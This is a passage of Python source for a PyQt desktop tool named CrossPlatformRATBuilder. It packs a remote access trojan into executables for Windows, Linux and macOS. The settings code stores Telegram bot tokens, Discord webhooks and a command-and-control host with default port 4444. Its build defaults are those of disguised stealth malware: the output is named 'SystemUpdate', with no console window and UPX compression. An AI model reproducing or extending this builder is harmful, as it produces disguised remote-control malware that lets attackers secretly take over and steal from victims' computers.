        ]
        
        if self.upx_compress.isChecked():
            pyinstaller_cmd.append("--upx-dir=.")
            
        self.log_build(f"Running: {' '.join(pyinstaller_cmd)}")
        result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True, cwd=self.temp_dir)
        
        if result.returncode != 0:
            self.log_build(f"PyInstaller error: {result.stderr}")
            raise Exception("Windows build failed")

    def build_linux_exe(self, output_dir, source_file, output_name):
        try:
            pyinstaller_cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile",
                "--name", output_name,
                "--distpath", str(output_dir),
                str(source_file)
            ]
            
            result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True, cwd=self.temp_dir)
            if result.returncode == 0:
                self.log_build("Linux executable built with PyInstaller")
            else:
                self.create_linux_script(output_dir, source_file, output_name)
                
        except Exception as e:
            self.create_linux_script(output_dir, source_file, output_name)

    def create_linux_script(self, output_dir, source_file, output_name):
        script_content = source_file.read_text()
        output_script = output_dir / output_name
        
        with open(output_script, 'w') as f:
            f.write("#!/usr/bin/env python3\\n")
            f.write(script_content)
            
        os.chmod(str(output_script), 0o755)
        self.log_build(f"Created Linux script: {output_script}")

    def build_macos_exe(self, output_dir, source_file, output_name):
        try:
            pyinstaller_cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile",
                "--name", output_name,
                "--distpath", str(output_dir),
                str(source_file)
            ]
            
            result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True, cwd=self.temp_dir)
            if result.returncode == 0:
                self.log_build("macOS executable built with PyInstaller")
            else:
                self.create_macos_script(output_dir, source_file, output_name)
                
        except Exception as e:
            self.create_macos_script(output_dir, source_file, output_name)

    def create_macos_script(self, output_dir, source_file, output_name):
        script_content = source_file.read_text()
        output_script = output_dir / output_name
        
        with open(output_script, 'w') as f:
            f.write("#!/usr/bin/env python3\\n")
            f.write(script_content)
            
        os.chmod(str(output_script), 0o755)
        self.log_build(f"Created macOS script: {output_script}")

    def build_for_all_platforms(self, output_dir, source_file):
        platforms = ["windows", "linux", "macos"]
        
        for platform_name in platforms:
            self.log_build(f"Building for {platform_name}...")
            try:
                self.build_for_platform(platform_name, output_dir, source_file)
                self.log_build(f"✅ {platform_name} build successful")
            except Exception as e:
                self.log_build(f"❌ {platform_name} build failed: {str(e)}")

    def save_config(self):
        config = self.get_current_config()
        try:
            with open(self.config_file, 'w') as f:
                json.dump(config, f, indent=2)
            self.log_message("💾 Configuration saved successfully")
        except Exception as e:
            self.log_message(f"❌ Failed to save configuration: {str(e)}")

    def load_config(self):
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                self.apply_config(config)
                self.log_message("📂 Configuration loaded successfully")
            except Exception as e:
                self.log_message(f"❌ Failed to load configuration: {str(e)}")

    def get_current_config(self):
        config = {
            'communication': {
                'method': self.comm_method.currentText(),
                'bot_token': self.bot_token.text(),
                'discord_webhook': self.discord_webhook.text(),
                'server_host': self.server_host.text(),
                'server_port': self.server_port.value(),
                'trusted_users': self.trusted_users.text(),
                'trusted_chats': self.trusted_chats.text(),
            },
            'platform': {
                'target_os': self.target_os.currentText(),
                'architecture': self.architecture.currentText(),
            },
            'build': {
                'output_name': self.output_name.text(),
                'output_dir': self.output_dir.text(),
                'python_version': self.python_version.currentText(),
                'onefile': self.onefile.isChecked(),
                'noconsole': self.noconsole.isChecked(),
                'upx_compress': self.upx_compress.isChecked(),
            }
        }
        
        features_config = {}
        for attr_name in dir(self):
            if attr_name.startswith('feature_') and hasattr(getattr(self, attr_name), 'isChecked'):
                features_config[attr_name] = getattr(self, attr_name).isChecked()
        config['features'] = features_config
        
        return config

    def apply_config(self, config):
        try:
            comm = config.get('communication', {})
            self.comm_method.setCurrentText(comm.get('method', 'Telegram'))
            self.bot_token.setText(comm.get('bot_token', ''))
            self.discord_webhook.setText(comm.get('discord_webhook', ''))
            self.server_host.setText(comm.get('server_host', '127.0.0.1'))
            self.server_port.setValue(comm.get('server_port', 4444))
            self.trusted_users.setText(comm.get('trusted_users', ''))
            self.trusted_chats.setText(comm.get('trusted_chats', ''))
            
            platform_config = config.get('platform', {})
            self.target_os.setCurrentText(platform_config.get('target_os', 'Windows'))
            self.architecture.setCurrentText(platform_config.get('architecture', 'x64'))
            
            features = config.get('features', {})
            for feature_name, enabled in features.items():
                if hasattr(self, feature_name):
                    getattr(self, feature_name).setChecked(enabled)
            
            build = config.get('build', {})
            self.output_name.setText(build.get('output_name', 'SystemUpdate'))
            self.output_dir.setText(build.get('output_dir', str(Path.home() / "Desktop")))
            self.python_version.setCurrentText(build.get('python_version', '3.10'))
            self.onefile.setChecked(build.get('onefile', True))
            self.noconsole.setChecked(build.get('noconsole', True))
            self.upx_compress.setChecked(build.get('upx_compress', True))
            
        except Exception as e:
            self.log_message(f"⚠️ Error applying configuration: {str(e)}")

    def closeEvent(self, event):
        try:
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
        except:
            pass
        event.accept()

def main():
    app = QApplication(sys.argv)
    
    splash = SplashScreen()
    splash.show()
    
    steps = [
        (10, "Loading core modules..."),
        (30, "Initializing UI..."),
        (50, "Setting up configuration..."),
        (70, "Preparing build system..."),
        (90, "Finalizing..."),
        (100, "Ready!")
    ]
    
    for progress, status in steps:
        splash.set_progress(progress, status)
        time.sleep(0.3)
        QApplication.processEvents()
    
    splash.close()
    
    window = CrossPlatformRATBuilder()
    window.show()
    
    sys.exit(app.exec_())
    
if __name__ == '__main__':
    main()
